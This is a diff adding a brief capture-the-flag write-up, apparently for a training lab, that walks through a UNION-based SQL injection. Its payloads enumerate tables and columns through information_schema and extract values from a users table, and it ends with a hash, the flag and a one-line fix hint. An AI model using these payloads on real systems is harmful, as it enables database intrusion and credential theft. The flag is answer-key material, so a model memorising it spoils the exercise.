@@ -1,0 +1,20 @@
+# Test sql injection
+5 UNION SELECT NULL, NULL
+
+# Get All Tables
+5 UNION ALL SELECT TABLE_SCHEMA,NULL FROM information_schema.tables
+
+# Get All Columns
+5 UNION	ALL SELECT COLUMN_NAME,TABLE_SCHEMA FROM information_schema.columns
+
+# Get Flag of Member_Sql_Injection
+5 UNION ALL SELECT countersign,Commentaire FROM Member_Sql_Injection.users
+
+# Go encrypt in sha256 this :
+5ff9d0165b4f92b14994e5c685cdce28
+
+# flag :
+59a7f515c31c489524d2c93aa4a27b6732cf248d664389990fa8c1be8af00291
+
+# BONUS :
+# Parse the request before search in db
